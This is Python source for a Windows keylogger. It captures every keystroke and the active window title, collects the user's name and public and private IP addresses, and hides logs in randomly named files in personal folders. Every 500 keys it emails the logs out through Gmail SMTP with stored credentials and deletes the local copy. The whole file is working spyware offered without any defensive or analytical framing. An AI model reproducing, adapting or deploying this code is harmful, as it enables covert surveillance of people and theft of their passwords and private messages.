from pynput.keyboard import Listener
import os
import random
import win32gui
from random import randrange
import smtplib
from email.message import EmailMessage
from email.mime.text import MIMEText
import json
import socket
import time
import requests
import threading
info_file=open('info.JSON',)
data = []
initialized_file=[]
config=json.load(info_file)
old_app=""
email=config["info"]["email"]
password=config["info"]["password"]
counter=0
datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

msg = f'[LOGS]\n -Date/Time: {datetime}\n  -User: {user}\n  -Public-IP: {publicIP}\n  -Private-IP: {privateIP}\n\n\n\n'
data.append(msg)
# Function to convert
def listToString(s):

    # initialize an empty string
    str1 = ""

    # traverse in the string
    for ele in s:
        str1 += ele

    # return string
    return str1

def send_file():
    while  True:
        global counter,data
        if(counter>500):
            time.sleep(4)
            write_to_file("".join(data))
            msg = EmailMessage()
            msg["From"] = email
            msg["Subject"] = "Subject"
            msg["To"] = email    
            msg.add_attachment(open(initialized_file[0], "r").read(), filename=initialized_file[0])
            with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp:
                smtp.login(email,password)
                smtp.send_message(msg)
                print("sent message")
            os.remove(initialized_file[0])    
            initialized_file.pop()
            counter=0
            data=[]

def write_to_file(data):
    UserPath=os.path.expanduser('~')
    FolderList=["\Downloads","\Documents","\Pictures"]
    FileFolder=random.choice(FolderList)
    FileName=randrange(100)
    FullPath=UserPath+FileFolder+"\\"+str(FileName)+".txt"
    file = open(FullPath, "x")
    initialized_file.append(FullPath)
    file.write(data)
    data=[]
    file.close()

def on_press(key):
    global counter
    global old_app
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if(new_app!=old_app and new_app!=""):
        data.append("\n\n"+str(new_app)+"\n\n")
        old_app=new_app


    

    keydict =	{
                  "Key.enter": "Enter",
                  "Key.backspace": "Backspace",
                  "Key.shift": "Shift",
                  "Key.ctrl_l":"CTRL",
                  "Key.print_screen": "PrintScreen",
                  "Key.alt_l":"ALT",
                  "\\x03":"CTRL-C",
                  "\\x13": "CTRL-S",
                  "\\x16": "CTRL-V",
                  "\\x17": "CTRL-W",
                  "Key.caps_lock":"CapsLock",
                  "Key.cmd":"WindowsKey",
                  "Key.space":"Space",
                  "Key.right":"RightArrow",
                  "Key.left":"LeftArrow",
                  "Key.up":"UpArrow",
                  "Key.down":"DownArrow",
                  "Key.delete":"Delete",
                  "Key.tab":"Tab",
                  "Key.esc":"esc"
                }
    counter+=1
    if str(key) in keydict:
        if(str(key)=="Key.space"):
            data.append("\n")
        else:
            data.append(keydict[str(key)])
    else:
        data.append(str(key).replace("'",""))


        

def on_release(rel):
    if str(rel) == 'Key.esc':
        print('Exiting...')
        exit()




if __name__=='__main__':
    Thread=threading.Thread(target=send_file)
    Thread.start()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()